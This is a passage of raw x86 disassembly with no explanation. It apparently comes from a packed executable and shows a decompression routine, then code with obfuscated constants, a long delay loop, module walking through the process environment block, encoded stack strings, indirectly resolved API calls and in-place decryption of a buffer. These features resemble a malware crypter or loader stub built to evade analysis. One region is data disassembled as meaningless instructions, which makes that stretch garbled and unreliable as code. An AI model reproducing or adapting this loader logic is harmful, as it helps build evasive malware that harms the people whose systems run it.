  42592d:	mov    edi,DWORD PTR [ebp-0x4]
  425930:	stos   BYTE PTR es:[edi],al
  425931:	jmp    0x425ac4
  425936:	mov    al,0xd8
  425938:	call   0x425b36
  42593d:	mov    esi,DWORD PTR [ebp-0x28]
  425940:	je     0x42595d
  425942:	mov    al,0xe4
  425944:	call   0x425b36
  425949:	mov    esi,DWORD PTR [ebp-0x2c]
  42594c:	je     0x425957
  42594e:	mov    esi,DWORD PTR [ebp-0x30]
  425951:	mov    ecx,DWORD PTR [ebp-0x2c]
  425954:	mov    DWORD PTR [ebp-0x30],ecx
  425957:	mov    ecx,DWORD PTR [ebp-0x28]
  42595a:	mov    DWORD PTR [ebp-0x2c],ecx
  42595d:	mov    ecx,DWORD PTR [ebp-0x24]
  425960:	mov    DWORD PTR [ebp-0x28],ecx
  425963:	mov    DWORD PTR [ebp-0x24],esi
  425966:	pop    eax
  425967:	pop    edi
  425968:	pop    ecx
  425969:	mov    edx,0xa68
  42596e:	mov    cl,0x8
  425970:	add    edx,edi
  425972:	push   edx
  425973:	push   edi
  425974:	cmp    al,0x7
  425976:	mov    al,cl
  425978:	jb     0x42597c
  42597a:	add    al,0x3
  42597c:	push   eax
  42597d:	mov    ebp,DWORD PTR [ebp-0x34]
  425980:	call   0x425b43
  425985:	jne    0x42599b
  425987:	mov    eax,DWORD PTR [ebp-0x18]
  42598a:	mov    edi,DWORD PTR [ebp-0x34]
  42598d:	shl    eax,0x3
  425990:	sub    ecx,ecx
  425992:	push   0x8
  425994:	pop    esi
  425995:	lea    edi,[edi+eax*2+0x4]
  425999:	jmp    0x4259d0
  42599b:	mov    ebp,DWORD PTR [ebp-0x34]
  42599e:	add    ebp,0x2
  4259a1:	call   0x425b43
  4259a6:	jne    0x4259c0
  4259a8:	mov    eax,DWORD PTR [ebp-0x18]
  4259ab:	mov    edi,DWORD PTR [ebp-0x34]
  4259ae:	shl    eax,0x3
  4259b1:	push   0x8
  4259b3:	pop    ecx
  4259b4:	push   0x8
  4259b6:	pop    esi
  4259b7:	lea    edi,[edi+eax*2+0x104]
  4259be:	jmp    0x4259d0
  4259c0:	mov    edi,0x204
  4259c5:	add    edi,DWORD PTR [ebp-0x34]
  4259c8:	push   0x10
  4259ca:	pop    ecx
  4259cb:	mov    esi,0x100
  4259d0:	mov    DWORD PTR [ebp-0x1c],ecx
  4259d3:	sub    eax,eax
  4259d5:	inc    eax
  4259d6:	mov    ebp,edi
  4259d8:	call   0x425b45
  4259dd:	mov    ecx,eax
  4259df:	sub    ecx,esi
  4259e1:	jb     0x4259d6
  4259e3:	add    DWORD PTR [ebp-0x1c],ecx
  4259e6:	cmp    DWORD PTR [ebp-0x3c],0x4
  4259ea:	jae    0x425aa0
  4259f0:	add    DWORD PTR [ebp-0x3c],0x7
  4259f4:	mov    ecx,DWORD PTR [ebp-0x1c]
  4259f7:	cmp    ecx,0x4
  4259fa:	jb     0x4259ff
  4259fc:	push   0x3
  4259fe:	pop    ecx
  4259ff:	mov    edi,DWORD PTR [ebp-0x38]
  425a02:	shl    ecx,0x6
  425a05:	sub    eax,eax
  425a07:	inc    eax
  425a08:	push   0x40
  425a0a:	pop    esi
  425a0b:	lea    edi,[edi+ecx*2+0x360]
  425a12:	mov    ebp,edi
  425a14:	call   0x425b45
  425a19:	mov    ecx,eax
  425a1b:	sub    ecx,esi
  425a1d:	jb     0x425a12
  425a1f:	mov    DWORD PTR [ebp-0x18],ecx
  425a22:	mov    DWORD PTR [ebp-0x24],ecx
  425a25:	cmp    ecx,0x4
  425a28:	jb     0x425a9d
  425a2a:	mov    esi,ecx
  425a2c:	and    DWORD PTR [ebp-0x24],0x1
  425a30:	shr    esi,1
  425a32:	or     DWORD PTR [ebp-0x24],0x2
  425a36:	dec    esi
  425a37:	cmp    ecx,0xe
  425a3a:	jae    0x425a55
  425a3c:	mov    eax,0x2af
  425a41:	sub    eax,ecx
  425a43:	mov    ecx,esi
  425a45:	shl    BYTE PTR [ebp-0x24],cl
  425a48:	add    eax,DWORD PTR [ebp-0x24]
  425a4b:	shl    eax,1
  425a4d:	add    eax,DWORD PTR [ebp-0x38]
  425a50:	mov    DWORD PTR [ebp-0x34],eax
  425a53:	jmp    0x425a82
  425a55:	sub    esi,0x4
  425a58:	call   0x425b02
  425a5d:	shr    ebx,1
  425a5f:	shl    DWORD PTR [ebp-0x24],1
  425a62:	cmp    DWORD PTR [ebp-0x20],ebx
  425a65:	jb     0x425a6d
  425a67:	inc    DWORD PTR [ebp-0x24]
  425a6a:	sub    DWORD PTR [ebp-0x20],ebx
  425a6d:	dec    esi
  425a6e:	jne    0x425a58
  425a70:	mov    eax,0x644
  425a75:	add    eax,DWORD PTR [ebp-0x38]
  425a78:	mov    DWORD PTR [ebp-0x34],eax
  425a7b:	shl    DWORD PTR [ebp-0x24],0x4
  425a7f:	push   0x4
  425a81:	pop    esi
  425a82:	sub    edi,edi
  425a84:	inc    edi
  425a85:	mov    eax,edi
  425a87:	mov    ebp,DWORD PTR [ebp-0x34]
  425a8a:	call   0x425b45
  425a8f:	test   al,0x1
  425a91:	je     0x425a96
  425a93:	or     DWORD PTR [ebp-0x24],edi
  425a96:	shl    edi,1
  425a98:	dec    esi
  425a99:	jne    0x425a87
  425a9b:	jmp    0x425a9d
  425a9d:	inc    DWORD PTR [ebp-0x24]
  425aa0:	mov    ecx,DWORD PTR [ebp-0x1c]
  425aa3:	add    ecx,0x2
  425aa6:	mov    edi,DWORD PTR [ebp-0x4]
  425aa9:	mov    eax,edi
  425aab:	sub    eax,DWORD PTR [ebp+0x24]
  425aae:	cmp    DWORD PTR [ebp-0x24],eax
  425ab1:	ja     0x425afd
  425ab3:	mov    esi,edi
  425ab5:	sub    esi,DWORD PTR [ebp-0x24]
  425ab8:	mov    edx,DWORD PTR [ebp+0x28]
  425abb:	lods   al,BYTE PTR ds:[esi]
  425abc:	stos   BYTE PTR es:[edi],al
  425abd:	cmp    edi,edx
  425abf:	jae    0x425ac4
  425ac1:	dec    ecx
  425ac2:	jne    0x425abb
  425ac4:	mov    DWORD PTR [ebp-0x4],edi
  425ac7:	movzx  esi,al
  425aca:	cmp    edi,DWORD PTR [ebp+0x28]
  425acd:	jb     0x42582e
  425ad3:	call   0x425b02
  425ad8:	sub    eax,eax
  425ada:	lea    ebp,[esp+0x3c]
  425ade:	mov    edx,DWORD PTR [ebp+0x20]
  425ae1:	mov    esi,DWORD PTR [ebp-0x8]
  425ae4:	sub    esi,DWORD PTR [ebp+0x18]
  425ae7:	mov    DWORD PTR [edx],esi
  425ae9:	mov    edx,DWORD PTR [ebp+0x2c]
  425aec:	mov    edi,DWORD PTR [ebp-0x4]
  425aef:	sub    edi,DWORD PTR [ebx+0x16]
  425af2:	lods   al,BYTE PTR ds:[esi]
  425af3:	outs   dx,BYTE PTR ds:[esi]
  425af4:	lods   eax,DWORD PTR ds:[esi]
  425af5:	repz inc DWORD PTR [ebx]
  425af8:	xchg   ecx,eax
  425af9:	test   BYTE PTR [esi-0x76cd1801],0x87
  425b00:	xor    eax,0x86758ce9
  425b05:	xchg   BYTE PTR [esi-0x6a75b076],al
  425b0b:	lea    edx,ds:0x5bb4dfa6
  425b11:	imul   esi,DWORD PTR [edx+0x5b],0xb41953f6
  425b18:	fwait
  425b19:	or     DWORD PTR [ebp-0x53c759f7],ecx
  425b1f:	fwait
  425b20:	or     DWORD PTR [ebx+ebx*2-0x4b6a0097],ebp
  425b27:	mov    ebx,0x8960c299
  425b2c:	lea    ecx,ds:0x299b9296
  425b32:	xchg   edx,eax
  425b33:	lea    esi,ds:0x8960c29e
  425b39:	xchg   edx,eax
  425b3a:	fwait
  425b3b:	cdq    
  425b3c:	mov    ah,0x3b
  425b3e:	test   eax,0x869b37bc
  425b43:	xor    cl,BYTE PTR [ecx-0x7964c844]
  425b49:	mov    WORD PTR [ebp-0x7a],?
  425b4c:	xchg   BYTE PTR [esi-0x4b09ac76],al
  425b52:	mov    bh,0x16
  425b54:	lea    dx,[edi]
  425b57:	push   ss
  425b58:	push   es
  425b59:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425b5a:	jb     0x425b13
  425b5c:	push   ss
  425b5d:	not    DWORD PTR [ebx-0x8]
  425b60:	mov    al,0xca
  425b62:	test   DWORD PTR [edi+0x158d6616],edx
  425b68:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425b69:	test   al,0xd7
  425b6b:	push   ss
  425b6c:	push   es
  425b6d:	mov    ah,0xb5
  425b6f:	ret    0x55b7
  425b72:	add    cl,al
  425b74:	jmp    0xcaf16a84
  425b79:	cmp    DWORD PTR [esp+0x20],ecx
  425b7d:	jae    0x425b96
  425b7f:	mov    ebx,ecx
  425b81:	mov    ecx,0x800
  425b86:	sub    ecx,edx
  425b88:	shr    ecx,0x5
  425b8b:	add    WORD PTR [ebp+0x0],cx
  425b8f:	add    eax,eax
  425b91:	lea    ebp,[esp+0x40]
  425b95:	ret    
  425b96:	shr    edx,0x5
  425b99:	sub    DWORD PTR [esp+0x20],ecx
  425b9d:	sub    ebx,ecx
  425b9f:	sub    WORD PTR [ebp+0x0],dx
  425ba3:	add    eax,eax
  425ba5:	add    eax,0x1
  425ba8:	lea    ebp,[esp+0x40]
  425bac:	ret    
  425bad:	push   ebp
  425bae:	mov    ebp,esp
  425bb0:	sub    esp,0x12c
  425bb6:	push   ebx
  425bb7:	push   esi
  425bb8:	push   edi
  425bb9:	mov    DWORD PTR [ebp-0x10],0xf89c85a5
  425bc0:	mov    DWORD PTR [ebp-0x18],0xf89c85ba
  425bc7:	mov    eax,DWORD PTR [ebp+0x8]
  425bca:	mov    DWORD PTR [ebp+0x8],eax
  425bcd:	mov    ecx,DWORD PTR [ebp-0x10]
  425bd0:	mov    ebx,0x75108aa
  425bd5:	xor    ecx,ebx
  425bd7:	mov    eax,0x3272f1
  425bdc:	add    ecx,eax
  425bde:	mov    DWORD PTR [ebp-0x24],ecx
  425be1:	mov    ecx,DWORD PTR [ebp-0x10]
  425be4:	xor    ecx,ebx
  425be6:	add    ecx,eax
  425be8:	mov    DWORD PTR [ebp-0x40],ecx
  425beb:	mov    ecx,DWORD PTR [ebp-0x10]
  425bee:	xor    ecx,ebx
  425bf0:	add    ecx,eax
  425bf2:	mov    DWORD PTR [ebp-0x3c],ecx
  425bf5:	mov    ecx,DWORD PTR [ebp-0x10]
  425bf8:	xor    ecx,ebx
  425bfa:	add    ecx,eax
  425bfc:	mov    DWORD PTR [ebp-0xd8],ecx
  425c02:	mov    DWORD PTR [ebp-0x50],0xf89f05a5
  425c09:	mov    DWORD PTR [ebp-0x3c],0xf89cb5a5
  425c10:	mov    DWORD PTR [ebp-0x54],0xf89c85b9
  425c17:	push   0x25
  425c19:	pop    ecx
  425c1a:	mov    DWORD PTR [ebp-0x30],ecx
  425c1d:	mov    DWORD PTR [ebp-0x30],ecx
  425c20:	push   0x65
  425c22:	pop    ecx
  425c23:	mov    DWORD PTR [ebp-0x30],ecx
  425c26:	mov    DWORD PTR [ebp-0x30],ecx
  425c29:	mov    DWORD PTR [ebp-0x30],0x4d
  425c30:	mov    DWORD PTR [ebp-0x30],0x43
  425c37:	mov    ecx,DWORD PTR [ebp-0x10]
  425c3a:	xor    ecx,ebx
  425c3c:	add    ecx,eax
  425c3e:	mov    DWORD PTR [ebp-0x30],ecx
  425c41:	mov    ecx,DWORD PTR [ebp-0x10]
  425c44:	xor    ecx,ebx
  425c46:	add    ecx,eax
  425c48:	mov    DWORD PTR [ebp-0x30],ecx
  425c4b:	mov    DWORD PTR [ebp-0x28],0x258
  425c52:	mov    DWORD PTR [ebp-0x34],0x36
  425c59:	mov    DWORD PTR [ebp-0x14],0x7a
  425c60:	lea    edi,[ebp-0x10c]
  425c66:	lea    esi,[ebp-0x12c]
  425c6c:	call   0x42692b
  425c71:	dec    DWORD PTR [ebp-0x14]
  425c74:	jne    0x425c60
  425c76:	dec    DWORD PTR [ebp-0x34]
  425c79:	jne    0x425c59
  425c7b:	dec    DWORD PTR [ebp-0x28]
  425c7e:	jne    0x425c52
  425c80:	mov    DWORD PTR [ebp-0x28],0x400e
  425c87:	mov    eax,DWORD PTR [ebp-0x10]
  425c8a:	xor    eax,ebx
  425c8c:	mov    esi,0x3272f1
  425c91:	add    eax,esi
  425c93:	mov    DWORD PTR [ebp-0x1c],eax
  425c96:	mov    eax,DWORD PTR [ebp-0x10]
  425c99:	and    DWORD PTR [ebp-0x94],0x0
  425ca0:	xor    eax,ebx
  425ca2:	add    eax,esi
  425ca4:	mov    DWORD PTR [ebp-0x38],eax
  425ca7:	mov    eax,fs:0x18
  425cad:	mov    DWORD PTR [ebp-0x94],eax
  425cb3:	mov    eax,DWORD PTR [eax+0x30]
  425cb6:	mov    DWORD PTR [ebp-0xcc],eax
  425cbc:	mov    eax,DWORD PTR [eax+0xc]
  425cbf:	mov    DWORD PTR [ebp-0xc0],eax
  425cc5:	mov    eax,DWORD PTR [ebp+0x8]
  425cc8:	lea    ecx,[ebp-0x94]
  425cce:	mov    DWORD PTR [eax+0x1a0],ecx
  425cd4:	mov    eax,DWORD PTR [ebp+0x8]
  425cd7:	lea    ecx,[ebp-0xcc]
  425cdd:	mov    DWORD PTR [eax+0x1a4],ecx
  425ce3:	mov    eax,DWORD PTR [ebp+0x8]
  425ce6:	push   DWORD PTR [ebp+0x8]
  425ce9:	lea    ecx,[ebp-0xc0]
  425cef:	mov    DWORD PTR [eax+0x1a8],ecx
  425cf5:	call   0x4280ec
  425cfa:	mov    ecx,DWORD PTR [ebp-0x10]
  425cfd:	xor    ecx,ebx
  425cff:	add    ecx,esi
  425d01:	cmp    ecx,eax
  425d03:	je     0x426086
  425d09:	mov    eax,DWORD PTR [ebp+0x8]
  425d0c:	mov    eax,DWORD PTR [eax+0x194]
  425d12:	mov    ecx,DWORD PTR [eax]
  425d14:	mov    eax,DWORD PTR [ebp+0x8]
  425d17:	mov    eax,DWORD PTR [eax+0x194]
  425d1d:	mov    eax,DWORD PTR [eax]
  425d1f:	add    eax,DWORD PTR [ecx+0x3c]
  425d22:	mov    ecx,DWORD PTR [ebp+0x8]
  425d25:	mov    ecx,DWORD PTR [ecx+0x1e0]
  425d2b:	lea    edx,[ebp-0xec]
  425d31:	push   edx
  425d32:	mov    edx,DWORD PTR [ebp+0x8]
  425d35:	mov    edx,DWORD PTR [edx+0x18c]
  425d3b:	mov    edx,DWORD PTR [edx]
  425d3d:	add    edx,DWORD PTR [eax+0x88]
  425d43:	push   0x4
  425d45:	push   DWORD PTR [eax+0x8c]
  425d4b:	push   edx
  425d4c:	call   DWORD PTR [ecx+0x1c]
  425d4f:	push   DWORD PTR [ebp+0x8]
  425d52:	xor    eax,eax
  425d54:	mov    DWORD PTR [ebp-0xa8],0x1b3e0e34
  425d5e:	mov    DWORD PTR [ebp-0xa4],0x12370d1c
  425d68:	mov    DWORD PTR [ebp-0xa0],0x3c0d180a
  425d72:	mov    BYTE PTR [ebp-0x9c],0x83
  425d79:	lea    edi,[ebp-0x9b]
  425d7f:	stos   DWORD PTR es:[edi],eax
  425d80:	stos   WORD PTR es:[edi],ax
  425d82:	stos   BYTE PTR es:[edi],al
  425d83:	xor    eax,eax
  425d85:	mov    DWORD PTR [ebp-0xbc],0x1b3e0e34
  425d8f:	mov    DWORD PTR [ebp-0xb8],0x12370d1c
  425d99:	mov    DWORD PTR [ebp-0xb4],0x2a0d180a
  425da3:	mov    BYTE PTR [ebp-0xb0],0x83
  425daa:	lea    edi,[ebp-0xaf]
  425db0:	stos   DWORD PTR es:[edi],eax
  425db1:	stos   WORD PTR es:[edi],ax
  425db3:	stos   BYTE PTR es:[edi],al
  425db4:	mov    edi,DWORD PTR [ebp+0x8]
  425db7:	mov    eax,DWORD PTR [ebp+0x8]
  425dba:	mov    edx,DWORD PTR [eax+0x1b8]
  425dc0:	mov    DWORD PTR [ebp-0x68],0xd0f0e17
  425dc7:	mov    DWORD PTR [ebp-0x64],0x1413101e
  425dce:	mov    WORD PTR [ebp-0x60],0x833c
  425dd4:	mov    DWORD PTR [ebp-0x90],0x1b3e0e34
  425dde:	mov    DWORD PTR [ebp-0x8c],0x173c0d1c
  425de8:	mov    DWORD PTR [ebp-0x88],0x311c1b13
  425df2:	mov    DWORD PTR [ebp-0x84],0xd181008
  425dfc:	mov    DWORD PTR [ebp-0x80],0x833c1e14
  425e03:	mov    DWORD PTR [ebp-0x7c],0x1b3e0e34
  425e0a:	mov    DWORD PTR [ebp-0x78],0x173c0d1c
  425e11:	mov    DWORD PTR [ebp-0x74],0x311c1b13
  425e18:	mov    DWORD PTR [ebp-0x70],0xd181008
  425e1f:	mov    DWORD PTR [ebp-0x6c],0x832a1e14
  425e26:	call   0x42811b
  425e2b:	push   eax
  425e2c:	mov    eax,DWORD PTR [ebp+0x8]
  425e2f:	mov    eax,DWORD PTR [eax+0x1a8]
  425e35:	push   DWORD PTR [eax]
  425e37:	call   0x427dbc
  425e3c:	test   eax,eax
  425e3e:	jne    0x425e90
  425e40:	mov    eax,DWORD PTR [ebp+0x8]
  425e43:	mov    eax,DWORD PTR [eax+0x1e0]
  425e49:	mov    edi,DWORD PTR [ebp+0x8]
  425e4c:	add    eax,0x4
  425e4f:	mov    DWORD PTR [ebp-0x20],eax
  425e52:	mov    eax,DWORD PTR [ebp+0x8]
  425e55:	mov    edx,DWORD PTR [eax+0x1b8]
  425e5b:	call   0x42811b
  425e60:	push   eax
  425e61:	mov    eax,DWORD PTR [ebp-0x20]
  425e64:	call   DWORD PTR [eax]
  425e66:	test   eax,eax
  425e68:	jne    0x425e90
  425e6a:	mov    eax,DWORD PTR [ebp+0x8]
  425e6d:	mov    eax,DWORD PTR [eax+0x1e0]
  425e73:	mov    edi,DWORD PTR [ebp+0x8]
  425e76:	add    eax,0x10
  425e79:	mov    DWORD PTR [ebp-0x20],eax
  425e7c:	mov    eax,DWORD PTR [ebp+0x8]
  425e7f:	mov    edx,DWORD PTR [eax+0x1b8]
  425e85:	call   0x42811b
  425e8a:	push   eax
  425e8b:	mov    eax,DWORD PTR [ebp-0x20]
  425e8e:	call   DWORD PTR [eax]
  425e90:	mov    eax,DWORD PTR [ebp-0x10]
  425e93:	mov    ecx,DWORD PTR [ebp-0x28]
  425e96:	xor    eax,ebx
  425e98:	add    eax,esi
  425e9a:	cmp    eax,ecx
  425e9c:	je     0x42605f
  425ea2:	mov    eax,DWORD PTR [ebp-0x18]
  425ea5:	xor    eax,ebx
  425ea7:	mov    ecx,0xffcd8d0f
  425eac:	sub    ecx,eax
  425eae:	add    ecx,DWORD PTR [ebp-0x28]
  425eb1:	mov    eax,DWORD PTR [ebp-0x1c]
  425eb4:	cmp    eax,ecx
  425eb6:	ja     0x42605f
  425ebc:	mov    DWORD PTR [ebp-0x34],0x0
  425ec3:	push   DWORD PTR [ebp+0x8]
  425ec6:	mov    edi,DWORD PTR [ebp+0x8]
  425ec9:	mov    eax,DWORD PTR [ebp+0x8]
  425ecc:	mov    edx,DWORD PTR [eax+0x1b4]
  425ed2:	call   0x42811b
  425ed7:	push   eax
  425ed8:	mov    eax,DWORD PTR [ebp+0x8]
  425edb:	mov    eax,DWORD PTR [eax+0x1a8]
  425ee1:	push   DWORD PTR [eax]
  425ee3:	call   0x427dbc
  425ee8:	mov    ecx,DWORD PTR [ebp+0x8]
  425eeb:	mov    ecx,DWORD PTR [ecx+0x19c]
  425ef1:	mov    DWORD PTR [ecx],eax
  425ef3:	mov    eax,DWORD PTR [ebp+0x8]
  425ef6:	mov    edi,DWORD PTR [eax+0x1e0]
  425efc:	mov    esi,DWORD PTR [ebp+0x8]
  425eff:	xor    eax,eax
  425f01:	lea    edx,[ebp-0x7c]
  425f04:	call   0x428151
  425f09:	push   eax
  425f0a:	mov    eax,DWORD PTR [ebp+0x8]
  425f0d:	mov    eax,DWORD PTR [eax+0x19c]
  425f13:	push   DWORD PTR [eax]
  425f15:	call   DWORD PTR [edi+0x8]
  425f18:	mov    DWORD PTR [ebp-0x20],eax
  425f1b:	mov    eax,DWORD PTR [ebp+0x8]
  425f1e:	mov    edi,DWORD PTR [eax+0x1e0]
  425f24:	mov    esi,DWORD PTR [ebp+0x8]
  425f27:	xor    eax,eax
  425f29:	lea    edx,[ebp-0x90]
  425f2f:	call   0x428151
  425f34:	push   eax
  425f35:	mov    eax,DWORD PTR [ebp+0x8]
  425f38:	mov    eax,DWORD PTR [eax+0x19c]
  425f3e:	push   DWORD PTR [eax]
  425f40:	call   DWORD PTR [edi+0x8]
  425f43:	mov    eax,DWORD PTR [ebp+0x8]
  425f46:	mov    edi,DWORD PTR [eax+0x1e0]
  425f4c:	mov    esi,DWORD PTR [ebp+0x8]
  425f4f:	xor    eax,eax
  425f51:	lea    edx,[ebp-0xa8]
  425f57:	call   0x428151
  425f5c:	push   eax
  425f5d:	mov    eax,DWORD PTR [ebp+0x8]
  425f60:	mov    eax,DWORD PTR [eax+0x19c]
  425f66:	push   DWORD PTR [eax]
  425f68:	call   DWORD PTR [edi+0x8]
  425f6b:	and    DWORD PTR [ebp-0x8],0x0
  425f6f:	mov    DWORD PTR [ebp-0x48],eax
  425f72:	mov    eax,DWORD PTR [ebp-0x8]
  425f75:	and    eax,0x7
  425f78:	add    eax,0x31
  425f7b:	push   eax
  425f7c:	call   DWORD PTR [ebp-0x20]
  425f7f:	test   eax,eax
  425f81:	je     0x425fc5
  425f83:	mov    eax,DWORD PTR [ebp-0x8]
  425f86:	push   0x19
  425f88:	xor    edx,edx
  425f8a:	pop    ecx
  425f8b:	div    ecx
  425f8d:	add    dl,0x41
  425f90:	movzx  eax,dl
  425f93:	push   eax
  425f94:	call   DWORD PTR [ebp-0x48]
  425f97:	test   eax,eax
  425f99:	jne    0x425fc5
  425f9b:	mov    eax,DWORD PTR [ebp+0x8]
  425f9e:	mov    edi,DWORD PTR [eax+0x1e0]
  425fa4:	mov    esi,DWORD PTR [ebp+0x8]
  425fa7:	xor    eax,eax
  425fa9:	lea    edx,[ebp-0x68]
  425fac:	call   0x428151
  425fb1:	push   eax
  425fb2:	mov    eax,DWORD PTR [ebp+0x8]
  425fb5:	mov    eax,DWORD PTR [eax+0x198]
  425fbb:	push   DWORD PTR [eax]
  425fbd:	call   DWORD PTR [edi+0x8]
  425fc0:	mov    DWORD PTR [ebp-0x14],eax
  425fc3:	jmp    0x425fc9
  425fc5:	and    DWORD PTR [ebp-0x14],0x0
  425fc9:	inc    DWORD PTR [ebp-0x8]
  425fcc:	cmp    DWORD PTR [ebp-0x8],0x10
  425fd0:	jb     0x425f72
  425fd2:	mov    eax,DWORD PTR [ebp-0x18]
  425fd5:	mov    esi,DWORD PTR [ebp+0x8]
  425fd8:	xor    eax,ebx
  425fda:	mov    edi,0x3272f1
  425fdf:	add    eax,edi
  425fe1:	lea    edx,[ebp-0x10c]
  425fe7:	call   0x428151
  425fec:	push   eax
  425fed:	mov    eax,DWORD PTR [ebp-0x10]
  425ff0:	mov    esi,DWORD PTR [ebp+0x8]
  425ff3:	xor    eax,ebx
  425ff5:	add    eax,edi
  425ff7:	lea    edx,[ebp-0x12c]
  425ffd:	call   0x428151
  426002:	push   eax
  426003:	call   DWORD PTR [ebp-0x14]
  426006:	mov    ecx,DWORD PTR [ebp-0x10]
  426009:	xor    ecx,ebx
  42600b:	add    ecx,edi
  42600d:	cmp    ecx,eax
  42600f:	jne    0x426018
  426011:	mov    DWORD PTR [ebp-0x34],0x1
  426018:	mov    eax,DWORD PTR [ebp-0x18]
  42601b:	mov    ecx,DWORD PTR [ebp-0x1c]
  42601e:	xor    eax,ebx
  426020:	lea    eax,[eax+ecx*1+0x3272f1]
  426027:	mov    DWORD PTR [ebp-0x1c],eax
  42602a:	mov    eax,DWORD PTR [ebp-0x34]
  42602d:	test   eax,eax
  42602f:	je     0x426043
  426031:	mov    eax,DWORD PTR [ebp-0x18]
  426034:	mov    ecx,DWORD PTR [ebp-0x38]
  426037:	xor    eax,ebx
  426039:	lea    eax,[eax+ecx*1+0x3272f1]
  426040:	mov    DWORD PTR [ebp-0x38],eax
  426043:	mov    eax,DWORD PTR [ebp-0x18]
  426046:	xor    eax,ebx
  426048:	mov    ecx,0xffcd8d0f
  42604d:	sub    ecx,eax
  42604f:	add    ecx,DWORD PTR [ebp-0x28]
  426052:	mov    eax,DWORD PTR [ebp-0x1c]
  426055:	cmp    eax,ecx
  426057:	jbe    0x425ebc
  42605d:	mov    esi,edi
  42605f:	mov    eax,DWORD PTR [ebp-0x38]
  426062:	mov    ecx,DWORD PTR [ebp-0x1c]
  426065:	cmp    ecx,eax
  426067:	jne    0x42607a
  426069:	push   DWORD PTR [ebp+0x8]
  42606c:	lea    eax,[ebp-0x40]
  42606f:	push   eax
  426070:	call   0x428bbe
  426075:	mov    DWORD PTR [ebp-0x24],eax
  426078:	jmp    0x426086
  42607a:	mov    eax,DWORD PTR [ebp-0x24]
  42607d:	mov    ecx,DWORD PTR [ebp-0x18]
  426080:	xor    ecx,ebx
  426082:	add    ecx,esi
  426084:	xor    DWORD PTR [eax],ecx
  426086:	mov    eax,DWORD PTR [ebp-0x10]
  426089:	mov    ecx,DWORD PTR [ebp-0x24]
  42608c:	xor    eax,ebx
  42608e:	add    eax,esi
  426090:	cmp    eax,ecx
  426092:	je     0x426809
  426098:	mov    eax,DWORD PTR [ebp-0x10]
  42609b:	mov    ecx,DWORD PTR [ebp-0x40]
  42609e:	xor    eax,ebx
  4260a0:	add    eax,esi
  4260a2:	cmp    eax,ecx
  4260a4:	je     0x426809
  4260aa:	mov    eax,DWORD PTR [ebp-0x10]
  4260ad:	xor    eax,ebx
  4260af:	add    eax,esi
  4260b1:	jmp    0x4260cf
  4260b3:	mov    edi,DWORD PTR [ebp-0x24]
  4260b6:	mov    cl,al
  4260b8:	and    cl,0x1f
  4260bb:	or     dl,0xff
  4260be:	sub    dl,cl
  4260c0:	add    BYTE PTR [edi+eax*1],dl
  4260c3:	mov    ecx,DWORD PTR [ebp-0x18]
  4260c6:	xor    ecx,ebx
  4260c8:	lea    eax,[eax+ecx*1+0x3272f1]
  4260cf:	mov    ecx,DWORD PTR [ebp-0x40]
  4260d2:	cmp    eax,ecx
  4260d4:	jb     0x4260b3
  4260d6:	mov    eax,DWORD PTR [ebp-0x40]
  4260d9:	mov    DWORD PTR [ebp-0x28],eax
  4260dc:	mov    eax,DWORD PTR [ebp-0x24]
  4260df:	mov    DWORD PTR [ebp-0x38],0xf89c85a5
  4260e6:	mov    DWORD PTR [ebp-0xd4],eax
  4260ec:	mov    edi,0xf89c85ba
  4260f1:	mov    DWORD PTR [ebp-0x2c],edi
  4260f4:	mov    eax,DWORD PTR [ebp-0x38]
  4260f7:	xor    eax,ebx
  4260f9:	add    eax,esi
  4260fb:	mov    DWORD PTR [ebp-0xc],eax
  4260fe:	mov    eax,DWORD PTR [ebp-0x38]
  426101:	xor    eax,ebx
  426103:	add    eax,esi
  426105:	mov    DWORD PTR [ebp-0x8],eax
  426108:	mov    DWORD PTR [ebp-0x48],0xf89c8585
  42610f:	mov    DWORD PTR [ebp-0x4c],0xf89c85bc
  426116:	mov    eax,DWORD PTR [ebp-0x38]
  426119:	mov    ecx,DWORD PTR [ebp-0x28]
  42611c:	xor    eax,ebx
  42611e:	add    eax,esi
  426120:	cmp    ecx,eax
  426122:	je     0x426321
  426128:	jmp    0x4262fd
  42612d:	mov    ecx,DWORD PTR [ebp-0xc]
  426130:	mov    eax,DWORD PTR [ebp-0x28]
  426133:	sub    eax,ecx
  426135:	mov    ecx,DWORD PTR [ebp-0x48]
  426138:	xor    ecx,ebx
  42613a:	add    ecx,esi
  42613c:	xor    edx,edx
  42613e:	div    ecx
  426140:	mov    DWORD PTR [ebp-0x8],eax
  426143:	mov    eax,DWORD PTR [ebp-0x4c]
  426146:	mov    ecx,DWORD PTR [ebp-0x8]
  426149:	xor    eax,ebx
  42614b:	add    eax,esi
  42614d:	cmp    ecx,eax
  42614f:	jbe    0x42615b
  426151:	mov    eax,DWORD PTR [ebp-0x4c]
  426154:	xor    eax,ebx
  426156:	add    eax,esi
  426158:	mov    DWORD PTR [ebp-0x8],eax
  42615b:	mov    eax,DWORD PTR [ebp-0x48]
  42615e:	mov    ecx,DWORD PTR [ebp-0x8]
  426161:	xor    eax,ebx
  426163:	add    eax,esi
  426165:	imul   eax,ecx
  426168:	mov    DWORD PTR [ebp-0x8],eax
  42616b:	mov    eax,DWORD PTR [ebp-0x38]
  42616e:	mov    ecx,DWORD PTR [ebp-0x8]
  426171:	xor    eax,ebx
  426173:	add    eax,esi
  426175:	cmp    ecx,eax
  426177:	je     0x4262eb
  42617d:	mov    eax,DWORD PTR [ebp-0x8]
  426180:	mov    DWORD PTR [ebp-0x14],eax
  426183:	mov    eax,DWORD PTR [ebp-0xc]
  426186:	add    eax,DWORD PTR [ebp-0xd4]
  42618c:	mov    DWORD PTR [ebp-0x20],0xf89c85a5
  426193:	mov    DWORD PTR [ebp-0x34],edi
  426196:	mov    DWORD PTR [ebp-0xe8],0xf89c85bb
  4261a0:	mov    DWORD PTR [ebp-0x8],eax
  4261a3:	mov    DWORD PTR [ebp-0x30],0xf89c85b8
  4261aa:	mov    DWORD PTR [ebp-0x1c],edi
  4261ad:	mov    eax,DWORD PTR [ebp-0x20]
  4261b0:	xor    eax,ebx
  4261b2:	add    eax,esi
  4261b4:	jmp    0x4262aa
  4261b9:	mov    DWORD PTR [ebp-0xe0],0xf89c85b0
  4261c3:	mov    DWORD PTR [ebp-0xc4],0xf89c858f
  4261cd:	mov    eax,DWORD PTR [ebp-0x1c]
  4261d0:	mov    ecx,DWORD PTR [ebp-0x44]
  4261d3:	xor    eax,ebx
  4261d5:	add    eax,esi
